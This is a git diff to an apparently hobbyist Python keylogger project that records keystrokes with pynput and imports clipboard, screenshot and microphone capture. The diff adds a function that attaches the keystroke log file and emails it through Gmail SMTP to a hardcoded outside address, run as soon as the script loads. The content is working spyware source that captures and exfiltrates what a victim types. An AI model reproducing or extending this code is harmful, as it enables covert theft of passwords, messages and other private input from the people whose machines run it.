@@ -9,6 +9,7 @@ import smtplib
 # System Info
 import socket
 import platform
+from email.quoprimime import body_check
 
 # Clipboard
 import win32clipboard
@@ -18,6 +19,7 @@ from pynput.keyboard import Key, Listener
 
 import time
 import os
+from dotenv import load_dotenv
 
 from scipy.io.wavfile import write
 import sounddevice as sd
@@ -33,6 +35,40 @@ from PIL import ImageGrab
 keys_information = "keys_log.txt"
 file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"
 
+load_dotenv()
+fromaddr = os.getenv("EMAIL_SENDER")
+password = os.getenv("GMAIL_SMTP_PASSWORD")
+toaddr = "tempmail8user@gmail.com"
+# print("Password: ",password)
+def send_mail(filename, attachment, toaddr):
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
+
+    body = "Body Of The Mail"
+    msg.attach(MIMEText(body,'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload(attachment.read())
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+    s.sendmail(fromaddr, toaddr, text)
+    s.quit()
+
+send_mail(keys_information, file_path+keys_information, toaddr)
+
 count = 0
 keys = []
 
@@ -41,7 +77,6 @@ def on_press(key):
     print(key)
     keys.append(key)
     count += 1
-
     if count >= 1:
         count = 0
         write_file(keys)
@@ -53,10 +88,9 @@ def write_file(keys):
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write("\n")
-            # else:  Key.ctrl_lKey.alt_l
+            # else:  # Key.ctrl_lKey.alt_l
             elif k.find("Key") == -1:
                 f.write(k)
-
             f.close()
 
 def on_release(key):
